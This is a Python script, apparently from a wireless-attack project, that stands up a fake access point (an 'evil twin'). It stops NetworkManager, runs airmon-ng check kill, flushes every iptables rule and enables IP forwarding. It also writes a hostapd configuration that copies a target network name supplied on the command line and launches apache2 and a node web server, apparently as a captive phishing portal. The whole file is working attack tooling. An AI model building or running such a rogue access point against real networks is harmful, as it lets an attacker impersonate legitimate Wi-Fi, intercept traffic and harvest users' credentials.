import os
import sys
from utils.console import *


def reset_setting():
	### Start system network service
	os.system('service NetworkManager start')
	### Stop apache2 service
	os.system('service apache2 stop')
	### Stop and kill the hostapd and dnsmasq services.
	os.system('service hostapd stop') #hostapd (host access point daemon) for make access point
	# os.system('service dnsmasq stop') #dsnmasq is to make DNS and DHCP server
	os.system('service rpcbind stop') # Remote Procedure Call bind
	# os.system('killall dnsmasq >/dev/null 2>&1')
	os.system('killall hostapd >/dev/null 2>&1')
	### Enable and start the local DNS stub listener that uses port 53 
	# os.system('systemctl enable systemd-resolved.service >/dev/null 2>&1') 
	# os.system('systemctl start systemd-resolved >/dev/null 2>&1') 
	
def fake_ap_on():
	### Disable and stop the local DNS stub listener that uses port 53.
	# os.system('systemctl disable systemd-resolved.service >/dev/null 2>&1')
	# os.system('systemctl stop systemd-resolved>/dev/null 2>&1')
	### Stop system network service 
	os.system('service NetworkManager stop')
	### Define the interface to be used as the fake AP & Define the fake AP IP address and subnet mask.
	os.system('airmon-ng check kill')
	# Stops network managers & Kill interfering processes left
	### Replace airmon-ng.
	os.system(' pkill -9 hostapd')
	# os.system(' pkill -9 dnsmasq')
	os.system(' pkill -9 wpa_supplicant') 
	# os.system(' pkill -9 avahi-daemon') # mDNS/DNS-SD
	os.system(' pkill -9 dhclient') # DHCP Client
	# os.system('killall dnsmasq >/dev/null 2>&1')
	os.system('killall hostapd >/dev/null 2>&1')
	os.system("ifconfig "+ interface2 +" 10.0.0.1 netmask 255.255.255.0")
	### Define the default gateway.
	os.system('route add default gw 10.0.0.1')
	### Enable IP forwarding (1 indicates to enable / 0 indicates to disable)
	# IP forwarding/Internet routing - is a process used to determine which path a packet or datagram can be sent.
	os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
	### Flush all chains - delete all of the firewall rules.
	# Chain is the set of rules that filter the incoming and outgoing data packets.
	os.system('iptables --flush')
	os.system('iptables --table nat --flush')
	os.system('iptables --delete-chain')
	os.system('iptables --table nat --delete-chain')
	### Allowing packets that routed through the system (=FORWARD) to pass through. 
	os.system('iptables -P FORWARD ACCEPT')
 

### Link dnsmasq and hostapd to the configuration files. And Run the web server.
def run_fake_ap():
	### Link the dnsmasq to the configuration file.
	# os.system('dnsmasq -C ./dnsmasq.conf')
	### Start apache2 - web server
	os.system('service apache2 start')
	### Start the web server
	os.system('gnome-terminal -- sh -c "node server/server.js; exec bash"')
	os.system('route add default gw 10.0.0.1')
	### Link the hostapd to the configuration file.
	os.system('hostapd hostapd.conf -B')
	os.system('service apache2 start')
	os.system('route add default gw 10.0.0.1')


### Create the hostapd and dnsmasq configuration files.	
def create_conf_files():
	# Set the interface that will be used as the fake AP.
	line1="interface="+ interface2 + "\n"
	# Set the name of the fake AP. 
	line2="ssid=" + essid + "\n"
	# Set the channel of the fake AP.
	line3="channel=1\n"
	# Set the driver.
	line4="driver=nl80211\n"

	### If this file is exists, we delete it.
	try:
		os.remove("./hostapd.conf")
	except OSError:
		pass  
	### Create and write the hostapd configuration file.
	hostapd_file=open("./hostapd.conf", "a+")
	hostapd_file.write(line1)
	hostapd_file.write(line2)
	hostapd_file.write(line3)
	hostapd_file.write(line4)

def remove_conf_files():
	try:
		os.remove("./hostapd.conf")
	except OSError:
	    pass


if __name__ == "__main__":
	
	### Step 1: Choosing the interface to be used as the AP
	print(G + "*** Step 1:  Choosing an interface that will be used for the fake AP. ***\n")
	# empty = input ("Press Enter to continue.........")
	print(W)
		# Reset all the setting
	reset_setting() 
	os.system('ifconfig')
	global interface2
	interface2 = input(G + "Please enter the interface name you want to use: ")
	
	# ssid=input("Please enter the SSID name ")
	global essid
	# The name of the fake AP (input)
	essid = sys.argv[1] 
	
	### Step 2: Activate the fake AP
	print(G + "*** Step 2:  Activation of the fake AP. ***\n")
	# empty = input ("Press Enter to continue.........")
	print(W)
	fake_ap_on()
	create_conf_files()
	run_fake_ap()
	
	### Step 3: Deactivate the fake AP
	print(G + "*** Step 3:  Deactivation of the fake AP. ***\n")
	empty = input ("\nPress Enter to Close Fake Accses Point AND Power OFF the fake AP.........\n")
	remove_conf_files()
	reset_setting()
	
	print(G + "Everything returned back to default setting. \nHopes to see you soon :) ***\n")